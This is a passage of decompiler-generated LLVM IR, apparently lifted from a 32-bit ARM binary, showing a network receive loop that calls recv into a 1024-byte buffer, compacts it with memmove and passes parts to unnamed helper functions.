  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a150 = icmp ult i8 %v4_a14c, 47
  store i1 %v6_a150, i1* %cpsr_n.global-to-local, align 1
  %v7_a150 = icmp eq i8 %v4_a14c, 47
  store i1 %v7_a150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a150, label %dec_label_pc_a8ac, label %dec_label_pc_a158

dec_label_pc_a158:                                ; preds = %dec_label_pc_a204, %dec_label_pc_a7f0, %dec_label_pc_a8dc, %dec_label_pc_a8ac, %dec_label_pc_a788, %dec_label_pc_a76c, %dec_label_pc_a148, %dec_label_pc_a8f8, %dec_label_pc_a7b8
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_a15c = load i32, i32* @r8, align 4
  %v3_a15c = add i32 %v2_a15c, -1452
  %v4_a15c = inttoptr i32 %v3_a15c to i8*
  store i8 1, i8* %v4_a15c, align 1
  br label %dec_label_pc_9590

dec_label_pc_a164:                                ; preds = %dec_label_pc_9580
  %v0_a164 = call i32* @__errno_location()
  %v1_a164 = ptrtoint i32* %v0_a164 to i32
  store i32 %v1_a164, i32* %r0.global-to-local, align 4
  %v0_a168 = load i32, i32* %sb.global-to-local, align 4
  %v1_a168 = add i32 %v0_a168, 1472
  store i32 %v1_a168, i32* %r3.global-to-local, align 4
  %v0_a170 = load i32, i32* @r8, align 4
  %v1_a170 = add i32 %v0_a170, 656
  %v2_a170 = inttoptr i32 %v1_a170 to i32*
  %v3_a170 = load i32, i32* %v2_a170, align 4
  store i32 %v3_a170, i32* %r3.global-to-local, align 4
  %v1_a178 = add i32 %v3_a170, -1024
  %v2_a178 = icmp ugt i32 %v3_a170, 1023
  store i1 %v2_a178, i1* %cpsr_c.global-to-local, align 1
  %v3_a178 = sub i32 1023, %v3_a170
  %v4_a178 = and i32 %v3_a178, %v3_a170
  %v5_a178 = icmp slt i32 %v4_a178, 0
  store i1 %v5_a178, i1* %cpsr_v.global-to-local, align 1
  %v6_a178 = icmp slt i32 %v1_a178, 0
  store i1 %v6_a178, i1* %cpsr_n.global-to-local, align 1
  %v7_a178 = icmp eq i32 %v3_a170, 1024
  store i1 %v7_a178, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a164, i32* %fp.global-to-local, align 4
  %v1_a180 = add i32 %v0_a168, 2116
  store i32 %v1_a180, i32* @r7, align 4
  br i1 %v7_a178, label %dec_label_pc_a280, label %dec_label_pc_a188

dec_label_pc_a188:                                ; preds = %dec_label_pc_a164, %dec_label_pc_a280, %dec_label_pc_a274
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a18c = load i32, i32* %fp.global-to-local, align 4
  %v2_a18c = inttoptr i32 %v1_a18c to i32*
  store i32 0, i32* %v2_a18c, align 4
  %v0_a190 = load i32, i32* @r8, align 4
  %v1_a190 = add i32 %v0_a190, 656
  %v2_a190 = inttoptr i32 %v1_a190 to i32*
  %v3_a190 = load i32, i32* %v2_a190, align 4
  store i32 %v3_a190, i32* %r1.global-to-local, align 4
  %v1_a194 = add i32 %v0_a190, -1456
  %v2_a194 = inttoptr i32 %v1_a194 to i32*
  %v3_a194 = load i32, i32* %v2_a194, align 4
  store i32 %v3_a194, i32* %r0.global-to-local, align 4
  %v1_a198 = sub i32 1024, %v3_a190
  store i32 %v1_a198, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a1a0 = load i32, i32* @r7, align 4
  %v2_a1a0 = add i32 %v0_a1a0, %v3_a190
  store i32 %v2_a1a0, i32* %r1.global-to-local, align 4
  %v4_a1a4 = call i32 @_recv(i32 %v3_a194, i32 %v2_a1a0, i32 %v1_a198, i32 16384)
  store i32 %v4_a1a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1a8 = icmp slt i32 %v4_a1a4, 0
  store i1 %v1_a1a8, i1* %cpsr_n.global-to-local, align 1
  %v2_a1a8 = icmp eq i32 %v4_a1a4, 0
  store i1 %v2_a1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1a8, label %dec_label_pc_a684, label %dec_label_pc_a1b0

dec_label_pc_a1b0:                                ; preds = %dec_label_pc_a188
  %v1_a1b0 = add i32 %v4_a1a4, 1
  %v2_a1b0 = icmp eq i32 %v4_a1a4, -1
  store i1 %v2_a1b0, i1* %cpsr_c.global-to-local, align 1
  %v3_a1b0 = sub i32 0, %v4_a1a4
  %v4_a1b0 = and i32 %v1_a1b0, %v3_a1b0
  %v5_a1b0 = icmp slt i32 %v4_a1b0, 0
  store i1 %v5_a1b0, i1* %cpsr_v.global-to-local, align 1
  %v6_a1b0 = icmp slt i32 %v1_a1b0, 0
  store i1 %v6_a1b0, i1* %cpsr_n.global-to-local, align 1
  %v7_a1b0 = icmp eq i32 %v1_a1b0, 0
  store i1 %v7_a1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1b0, label %dec_label_pc_a6a8, label %dec_label_pc_a1b8

dec_label_pc_a1b8:                                ; preds = %dec_label_pc_a1b0
  %v0_a1b8 = load i32, i32* @r8, align 4
  %v1_a1b8 = add i32 %v0_a1b8, 656
  %v2_a1b8 = inttoptr i32 %v1_a1b8 to i32*
  %v3_a1b8 = load i32, i32* %v2_a1b8, align 4
  store i32 %v2_9530, i32* %r1.global-to-local, align 4
  %v2_a1c0 = add i32 %v3_a1b8, %v4_a1a4
  store i32 %v2_a1c0, i32* @r4, align 4
  store i32 %v2_a1c0, i32* %v2_a1b8, align 4
  %v0_a1c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a1c8 = load i32, i32* @r8, align 4
  %v2_a1c8 = add i32 %v1_a1c8, -1448
  %v3_a1c8 = inttoptr i32 %v2_a1c8 to i32*
  store i32 %v0_a1c8, i32* %v3_a1c8, align 4
  br label %dec_label_pc_a254

dec_label_pc_a1d0:                                ; preds = %dec_label_pc_a254
  %v1_a1d0 = add i32 %v0_a254, -4
  %v2_a1d0 = inttoptr i32 %v1_a1d0 to i32*
  %v3_a1d0 = load i32, i32* %v2_a1d0, align 4
  store i32 %v3_a1d0, i32* @sl, align 4
  %v1_a1d4 = load i32, i32* @r4, align 4
  %v5_a1d8 = icmp slt i32 %v3_a254, %v1_a1d4
  %storemerge74 = select i1 %v5_a1d8, i32 %v3_a254, i32 %v1_a1d4
  store i32 %storemerge74, i32* @r5, align 4
  %v2_a1e0 = sub i32 %v3_a254, %storemerge74
  store i32 %v2_a1e0, i32* @r6, align 4
  %v1_a1e4 = add i32 %v3_a1d0, -1
  %v2_a1e4 = icmp ne i32 %v3_a1d0, 0
  store i1 %v2_a1e4, i1* %cpsr_c.global-to-local, align 1
  %v3_a1e4 = sub i32 0, %v3_a1d0
  %v4_a1e4 = and i32 %v3_a1d0, %v3_a1e4
  %v5_a1e4 = icmp slt i32 %v4_a1e4, 0
  store i1 %v5_a1e4, i1* %cpsr_v.global-to-local, align 1
  %v6_a1e4 = icmp slt i32 %v1_a1e4, 0
  store i1 %v6_a1e4, i1* %cpsr_n.global-to-local, align 1
  %v7_a1e4 = icmp eq i32 %v3_a1d0, 1
  store i1 %v7_a1e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a1e0, i32* %v2_a254, align 4
  br i1 %v7_a1e4, label %dec_label_pc_a2a0, label %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge

dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge: ; preds = %dec_label_pc_a1d0
  %v0_a1f0.pr.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a260, %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge, %dec_label_pc_a2c8
  %v0_a1f0 = phi i32 [ %v3_a2c8, %dec_label_pc_a2c8 ], [ %v0_a1f0.pr.pre, %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge ], [ %v3_a254, %dec_label_pc_a260 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1f0 = icmp slt i32 %v0_a1f0, 0
  store i1 %v1_a1f0, i1* %cpsr_n.global-to-local, align 1
  %v2_a1f0 = icmp eq i32 %v0_a1f0, 0
  store i1 %v2_a1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1f0, label %dec_label_pc_a1f8, label %dec_label_pc_a218

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1f0
  %v0_a1f8 = load i32, i32* @r8, align 4
  %v1_a1f8 = add i32 %v0_a1f8, 4
  %v2_a1f8 = inttoptr i32 %v1_a1f8 to i32*
  %v3_a1f8 = load i32, i32* %v2_a1f8, align 4
  store i32 %v3_a1f8, i32* @r4, align 4
  %v1_a1fc = add i32 %v3_a1f8, -1
  %v2_a1fc = icmp ne i32 %v3_a1f8, 0
  store i1 %v2_a1fc, i1* %cpsr_c.global-to-local, align 1
  %v3_a1fc = sub i32 0, %v3_a1f8
  %v4_a1fc = and i32 %v3_a1f8, %v3_a1fc
  %v5_a1fc = icmp slt i32 %v4_a1fc, 0
  store i1 %v5_a1fc, i1* %cpsr_v.global-to-local, align 1
  %v6_a1fc = icmp slt i32 %v1_a1fc, 0
  store i1 %v6_a1fc, i1* %cpsr_n.global-to-local, align 1
  %v7_a1fc = icmp eq i32 %v3_a1f8, 1
  store i1 %v7_a1fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1fc, label %dec_label_pc_a2d0, label %dec_label_pc_a204

dec_label_pc_a204:                                ; preds = %dec_label_pc_a1f8
  %v1_a204 = add i32 %v0_a1f8, 656
  %v2_a204 = inttoptr i32 %v1_a204 to i32*
  %v3_a204 = load i32, i32* %v2_a204, align 4
  %v0_a208 = load i32, i32* @r5, align 4
  %v2_a208 = sub i32 %v3_a204, %v0_a208
  store i32 %v2_a208, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a20c = icmp slt i32 %v2_a208, 0
  store i1 %v1_a20c, i1* %cpsr_n.global-to-local, align 1
  %v2_a20c = icmp eq i32 %v2_a208, 0
  store i1 %v2_a20c, i1* %cpsr_z.global-to-local, align 1
  %v2_a210 = add i32 %v0_a1f8, 8
  %v3_a210 = inttoptr i32 %v2_a210 to i32*
  store i32 %v2_a208, i32* %v3_a210, align 4
  br i1 %v2_a20c, label %dec_label_pc_a158, label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %dec_label_pc_a1f0, %dec_label_pc_a2d0, %dec_label_pc_a204, %dec_label_pc_a358
  %v0_a218 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a218 = icmp slt i32 %v0_a218, 0
  store i1 %v1_a218, i1* %cpsr_n.global-to-local, align 1
  %v2_a218 = icmp eq i32 %v0_a218, 0
  store i1 %v2_a218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a218, label %dec_label_pc_a268, label %dec_label_pc_a220

dec_label_pc_a220:                                ; preds = %dec_label_pc_a218
  %v0_a220 = load i32, i32* @r8, align 4
  %v1_a220 = add i32 %v0_a220, 656
  %v2_a220 = inttoptr i32 %v1_a220 to i32*
  %v3_a220 = load i32, i32* %v2_a220, align 4
  store i32 %v3_a220, i32* %r3.global-to-local, align 4
  %v2_a224 = sub i32 %v3_a220, %v0_a218
  store i32 %v2_a224, i32* %r4.global-to-local, align 4
  store i32 %v2_a224, i32* %r2.global-to-local, align 4
  store i32 %v2_a224, i32* %v2_a220, align 4
  %v0_a230 = load i32, i32* @r7, align 4
  %v1_a230 = load i32, i32* @r5, align 4
  %v2_a230 = add i32 %v1_a230, %v0_a230
  store i32 %v2_a230, i32* %r1.global-to-local, align 4
  store i32 %v0_a230, i32* %r0.global-to-local, align 4
  %v3_a238 = call i32 @_memmove(i32 %v0_a230, i32 %v2_a230, i32 %v2_a224)
  store i32 %v3_a238, i32* %r0.global-to-local, align 4
  %v0_a23c = load i32, i32* @r8, align 4
  %v1_a23c = add i32 %v0_a23c, 656
  %v2_a23c = inttoptr i32 %v1_a23c to i32*
  %v3_a23c = load i32, i32* %v2_a23c, align 4
  store i32 %v3_a23c, i32* @r4, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a244 = load i32, i32* %sb.global-to-local, align 4
  %v2_a244 = add i32 %v1_a244, %v3_a23c
  store i32 %v2_a244, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a248 = icmp slt i32 %v3_a23c, 0
  store i1 %v1_a248, i1* %cpsr_n.global-to-local, align 1
  %v2_a248 = icmp eq i32 %v3_a23c, 0
  store i1 %v2_a248, i1* %cpsr_z.global-to-local, align 1
  %v3_a24c = add i32 %v2_a244, 2116
  %v4_a24c = inttoptr i32 %v3_a24c to i8*
  store i8 0, i8* %v4_a24c, align 1
  %v0_a250 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a250, label %dec_label_pc_a268, label %dec_label_pc_a254

dec_label_pc_a254:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a1b8
  %v0_a254 = load i32, i32* @r8, align 4
  %v1_a254 = add i32 %v0_a254, 8
  %v2_a254 = inttoptr i32 %v1_a254 to i32*
  %v3_a254 = load i32, i32* %v2_a254, align 4
  store i32 %v3_a254, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a258 = icmp slt i32 %v3_a254, 0
  store i1 %v1_a258, i1* %cpsr_n.global-to-local, align 1
  %v2_a258 = icmp eq i32 %v3_a254, 0
  store i1 %v2_a258, i1* %cpsr_z.global-to-local, align 1
  %v5_a25c = icmp sgt i32 %v3_a254, 0
  br i1 %v5_a25c, label %dec_label_pc_a1d0, label %dec_label_pc_a260

dec_label_pc_a260:                                ; preds = %dec_label_pc_a254
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a268:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a218
  %v0_a268 = load i32, i32* @r8, align 4
  %v1_a268 = add i32 %v0_a268, -1452
  %v2_a268 = inttoptr i32 %v1_a268 to i8*
  %v3_a268 = load i8, i8* %v2_a268, align 1
  %v4_a268 = zext i8 %v3_a268 to i32
  store i32 %v4_a268, i32* %r3.global-to-local, align 4
  %v2_a26c = icmp ugt i8 %v3_a268, 6
  store i1 %v2_a26c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a26c = icmp ult i8 %v3_a268, 7
  store i1 %v6_a26c, i1* %cpsr_n.global-to-local, align 1
  %v7_a26c = icmp eq i8 %v3_a268, 7
  store i1 %v7_a26c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a26c, label %dec_label_pc_a274, label %dec_label_pc_9590

dec_label_pc_a274:                                ; preds = %dec_label_pc_a268
  %v1_a274 = add i32 %v0_a268, 656
  %v2_a274 = inttoptr i32 %v1_a274 to i32*
  %v3_a274 = load i32, i32* %v2_a274, align 4
  store i32 %v3_a274, i32* %r3.global-to-local, align 4
  %v1_a278 = add i32 %v3_a274, -1024
  %v2_a278 = icmp ugt i32 %v3_a274, 1023
  store i1 %v2_a278, i1* %cpsr_c.global-to-local, align 1
  %v3_a278 = sub i32 1023, %v3_a274
  %v4_a278 = and i32 %v3_a278, %v3_a274
  %v5_a278 = icmp slt i32 %v4_a278, 0
  store i1 %v5_a278, i1* %cpsr_v.global-to-local, align 1
  %v6_a278 = icmp slt i32 %v1_a278, 0
  store i1 %v6_a278, i1* %cpsr_n.global-to-local, align 1
  %v7_a278 = icmp eq i32 %v3_a274, 1024
  store i1 %v7_a278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a278, label %dec_label_pc_a280.loopexit, label %dec_label_pc_a188

dec_label_pc_a280.loopexit:                       ; preds = %dec_label_pc_a274
  %v0_a280.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a280

dec_label_pc_a280:                                ; preds = %dec_label_pc_a280.loopexit, %dec_label_pc_a164
  %v0_a280 = phi i32 [ %v0_a280.pre, %dec_label_pc_a280.loopexit ], [ %v1_a180, %dec_label_pc_a164 ]
  store i32 %v0_a280, i32* %r0.global-to-local, align 4
  %v1_a284 = add i32 %v0_a280, 64
  store i32 %v1_a284, i32* %r1.global-to-local, align 4
  store i32 960, i32* %r2.global-to-local, align 4
  %v3_a28c = call i32 @_memmove(i32 %v0_a280, i32 %v1_a284, i32 960)
  store i32 %v3_a28c, i32* %r0.global-to-local, align 4
  %v0_a290 = load i32, i32* @r8, align 4
  %v1_a290 = add i32 %v0_a290, 656
  %v2_a290 = inttoptr i32 %v1_a290 to i32*
  %v3_a290 = load i32, i32* %v2_a290, align 4
  store i32 %v3_a290, i32* %r3.global-to-local, align 4
  %v1_a294 = add i32 %v3_a290, -64
  store i32 %v1_a294, i32* @r4, align 4
  store i32 %v1_a294, i32* %v2_a290, align 4
  br label %dec_label_pc_a188

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a1d0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_a2a8 = call i32 @function_12f90(i32 36, i32* null)
  %v0_a2ac = load i32, i32* @r4, align 4
  store i32 %v0_a2ac, i32* %r1.global-to-local, align 4
  store i32 %v3_a2a8, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a2b8 = load i32, i32* @r7, align 4
  store i32 %v0_a2b8, i32* %r0.global-to-local, align 4
  %v4_a2bc = call i32 @function_13a60(i32 %v0_a2b8, i32 %v0_a2ac, i32 %v3_a2a8, i32 11)
  store i32 %v4_a2bc, i32* %r0.global-to-local, align 4
  %v2_a2c0 = add i32 %v4_a2bc, 1
  %v3_a2c0 = icmp eq i32 %v4_a2bc, -1
  store i1 %v3_a2c0, i1* %cpsr_c.global-to-local, align 1
  %v4_a2c0 = sub i32 0, %v4_a2bc
  %v5_a2c0 = and i32 %v2_a2c0, %v4_a2c0
  %v6_a2c0 = icmp slt i32 %v5_a2c0, 0
  store i1 %v6_a2c0, i1* %cpsr_v.global-to-local, align 1
  %v7_a2c0 = icmp slt i32 %v2_a2c0, 0
  store i1 %v7_a2c0, i1* %cpsr_n.global-to-local, align 1
  %v8_a2c0 = icmp eq i32 %v2_a2c0, 0
  store i1 %v8_a2c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a2c0, label %dec_label_pc_a2c8, label %dec_label_pc_a82c

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2a0
  %v0_a2c8 = load i32, i32* @r8, align 4
  %v1_a2c8 = add i32 %v0_a2c8, 8
  %v2_a2c8 = inttoptr i32 %v1_a2c8 to i32*
  %v3_a2c8 = load i32, i32* %v2_a2c8, align 4
  store i32 %v3_a2c8, i32* @r6, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a1f8
  %v0_a2d0 = load i32, i32* @r7, align 4
  store i32 %v0_a2d0, i32* %r0.global-to-local, align 4
  %v1_a2d4 = add i32 %v0_a1f8, 656
  %v2_a2d4 = inttoptr i32 %v1_a2d4 to i32*
  %v3_a2d4 = load i32, i32* %v2_a2d4, align 4
  store i32 %v3_a2d4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_a2e0 = call i32 @function_13a60(i32 %v0_a2d0, i32 %v3_a2d4, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32 2)
  store i32 %v4_a2e0, i32* %r0.global-to-local, align 4
  %v1_a2e4 = add i32 %v4_a2e0, 1
  %v2_a2e4 = icmp eq i32 %v4_a2e0, -1
  store i1 %v2_a2e4, i1* %cpsr_c.global-to-local, align 1
  %v3_a2e4 = sub i32 0, %v4_a2e0
  %v4_a2e4 = and i32 %v1_a2e4, %v3_a2e4
  %v5_a2e4 = icmp slt i32 %v4_a2e4, 0
  store i1 %v5_a2e4, i1* %cpsr_v.global-to-local, align 1
  %v6_a2e4 = icmp slt i32 %v1_a2e4, 0
  store i1 %v6_a2e4, i1* %cpsr_n.global-to-local, align 1
  %v7_a2e4 = icmp eq i32 %v1_a2e4, 0
  store i1 %v7_a2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2e4, label %dec_label_pc_a218, label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2d0
  %v0_a2ec = load i32, i32* @r8, align 4
  %v1_a2ec = add i32 %v0_a2ec, 656
  %v2_a2ec = inttoptr i32 %v1_a2ec to i32*
  %v3_a2ec = load i32, i32* %v2_a2ec, align 4
  store i32 %v3_a2ec, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_a2f8 = load i32, i32* @r7, align 4
  store i32 %v0_a2f8, i32* %r0.global-to-local, align 4
  %v4_a2fc = call i32 @function_13a60(i32 %v0_a2f8, i32 %v3_a2ec, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32 2)
  %v1_a300 = load i32, i32* %sb.global-to-local, align 4
  %v2_a300 = add i32 %v1_a300, %v4_a2fc
  store i32 %v2_a300, i32* %ip.global-to-local, align 4
  store i32 %v4_a2fc, i32* @r5, align 4
  store i32 %v4_a2fc, i32* %r1.global-to-local, align 4
  %v0_a30c = load i32, i32* @r7, align 4
  store i32 %v0_a30c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1431c.96 to i32), i32* %r2.global-to-local, align 4
  %v0_a314 = load i32, i32* @r4, align 4
  store i32 %v0_a314, i32* %r3.global-to-local, align 4
  %v0_a318 = load i32, i32* @r6, align 4
  %v1_a318 = trunc i32 %v0_a318 to i8
  %v3_a318 = add i32 %v2_a300, 2114
  %v4_a318 = inttoptr i32 %v3_a318 to i8*
  store i8 %v1_a318, i8* %v4_a318, align 1
  %v4_a31c = call i32 @function_13a60(i32 %v0_a30c, i32 %v4_a2fc, i32 ptrtoint (i32* @global_var_1431c.96 to i32), i32 %v0_a314)
  store i32 %v4_a31c, i32* %r0.global-to-local, align 4
  %v1_a320 = add i32 %v4_a31c, 1
  %v2_a320 = icmp eq i32 %v4_a31c, -1
  store i1 %v2_a320, i1* %cpsr_c.global-to-local, align 1
  %v3_a320 = sub i32 0, %v4_a31c
  %v4_a320 = and i32 %v1_a320, %v3_a320
  %v5_a320 = icmp slt i32 %v4_a320, 0
  store i1 %v5_a320, i1* %cpsr_v.global-to-local, align 1
  %v6_a320 = icmp slt i32 %v1_a320, 0
  store i1 %v6_a320, i1* %cpsr_n.global-to-local, align 1
  %v7_a320 = icmp eq i32 %v1_a320, 0
  store i1 %v7_a320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a320, label %dec_label_pc_a344, label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a2ec
  %v0_a328 = load i32, i32* @r7, align 4
  store i32 %v0_a328, i32* %r0.global-to-local, align 4
  %v0_a32c = load i32, i32* @r5, align 4
  store i32 %v0_a32c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1431c.96 to i32), i32* %r2.global-to-local, align 4
  %v0_a334 = load i32, i32* @r4, align 4
  store i32 %v0_a334, i32* %r3.global-to-local, align 4
  %v4_a338 = call i32 @function_13a60(i32 %v0_a328, i32 %v0_a32c, i32 ptrtoint (i32* @global_var_1431c.96 to i32), i32 %v0_a334)
  %v1_a33c = load i32, i32* %sb.global-to-local, align 4
  %v2_a33c = add i32 %v1_a33c, %v4_a338
  store i32 %v2_a33c, i32* %r0.global-to-local, align 4
  %v0_a340 = load i32, i32* @r6, align 4
  %v1_a340 = trunc i32 %v0_a340 to i8
  %v3_a340 = add i32 %v2_a33c, 2116
  %v4_a340 = inttoptr i32 %v3_a340 to i8*
  store i8 %v1_a340, i8* %v4_a340, align 1
  br label %dec_label_pc_a344

dec_label_pc_a344:                                ; preds = %dec_label_pc_a2ec, %dec_label_pc_a328
  %v0_a344 = load i32, i32* @r7, align 4
  store i32 %v0_a344, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_a34c = inttoptr i32 %v0_a344 to i8*
  %v3_a34c = call i32 @function_13ac8(i8* %v2_a34c, i32 16)
  store i32 %v3_a34c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a350 = icmp slt i32 %v3_a34c, 0
  store i1 %v1_a350, i1* %cpsr_n.global-to-local, align 1
  %v2_a350 = icmp eq i32 %v3_a34c, 0
  store i1 %v2_a350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a350, label %dec_label_pc_aadc, label %dec_label_pc_a358

dec_label_pc_a358:                                ; preds = %dec_label_pc_a344
  %v1_a358 = add i32 %v3_a34c, 2
  store i32 %v1_a358, i32* %r6.global-to-local, align 4
  %v1_a35c = load i32, i32* @r8, align 4
  %v2_a35c = add i32 %v1_a35c, 8
  %v3_a35c = inttoptr i32 %v2_a35c to i32*
  store i32 %v1_a358, i32* %v3_a35c, align 4
  br label %dec_label_pc_a218

dec_label_pc_a364:                                ; preds = %dec_label_pc_9a0c
  %v0_a364 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_a364, i32* %r1.global-to-local, align 4
  %v0_a368 = load i32, i32* @r6, align 4
  store i32 %v0_a368, i32* @r0, align 4
  %v2_a36c = inttoptr i32 %v0_a368 to i8*
  %v3_a36c = call i32 @function_139c4(i8* %v2_a36c, i32 %v0_a364)
  store i32 %v3_a36c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a24

dec_label_pc_a374:                                ; preds = %dec_label_pc_9588
  %v0_a374 = call i32* @__errno_location()
  %v2_a374 = ptrtoint i32* %v0_a374 to i32
  store i32 %v2_a374, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v2_a374, i32* @r4, align 4
  br label %dec_label_pc_a380

dec_label_pc_a380:                                ; preds = %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge, %dec_label_pc_a374
  %v1_a380 = phi i32 [ %v1_a380.pre, %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge ], [ %v2_a374, %dec_label_pc_a374 ]
  %v0_a380 = phi i32 [ %v0_a380.pre, %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge ], [ 0, %dec_label_pc_a374 ]
  %v2_a380 = inttoptr i32 %v1_a380 to i32*
  store i32 %v0_a380, i32* %v2_a380, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  %v0_a388 = load i32, i32* @r8, align 4
  %v1_a388 = add i32 %v0_a388, -1456
  %v2_a388 = inttoptr i32 %v1_a388 to i32*
  %v3_a388 = load i32, i32* %v2_a388, align 4
  store i32 %v3_a388, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_a394 = call i32 @_recv(i32 %v3_a388, i32 %v2_8fd8, i32 10240, i32 16384)
  store i32 %v4_a394, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a398 = icmp slt i32 %v4_a394, 0
  store i1 %v1_a398, i1* %cpsr_n.global-to-local, align 1
  %v2_a398 = icmp eq i32 %v4_a394, 0
  store i1 %v2_a398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a398, label %dec_label_pc_a678, label %dec_label_pc_a3a0

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a380
  %v2_a3a0 = add i32 %v4_a394, 1
  %v3_a3a0 = icmp eq i32 %v4_a394, -1
  store i1 %v3_a3a0, i1* %cpsr_c.global-to-local, align 1
  %v4_a3a0 = sub i32 0, %v4_a394
  %v5_a3a0 = and i32 %v2_a3a0, %v4_a3a0
  %v6_a3a0 = icmp slt i32 %v5_a3a0, 0
  store i1 %v6_a3a0, i1* %cpsr_v.global-to-local, align 1
  %v7_a3a0 = icmp slt i32 %v2_a3a0, 0
  store i1 %v7_a3a0, i1* %cpsr_n.global-to-local, align 1
  %v8_a3a0 = icmp eq i32 %v2_a3a0, 0
  store i1 %v8_a3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a3a0, label %dec_label_pc_a3a8, label %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge

dec_label_pc_a3a0.dec_label_pc_a380_crit_edge:    ; preds = %dec_label_pc_a3a0
  %v0_a380.pre = load i32, i32* @r5, align 4
  %v1_a380.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a380

dec_label_pc_a3a8:                                ; preds = %dec_label_pc_a3a0
  %v0_a3a8 = load i32, i32* @r4, align 4
  %v1_a3a8 = inttoptr i32 %v0_a3a8 to i32*
  %v2_a3a8 = load i32, i32* %v1_a3a8, align 4
  store i32 %v2_a3a8, i32* %r3.global-to-local, align 4
  %v1_a3ac = add i32 %v2_a3a8, -11
  %v2_a3ac = icmp ugt i32 %v2_a3a8, 10
  store i1 %v2_a3ac, i1* %cpsr_c.global-to-local, align 1
  %v3_a3ac = sub i32 10, %v2_a3a8
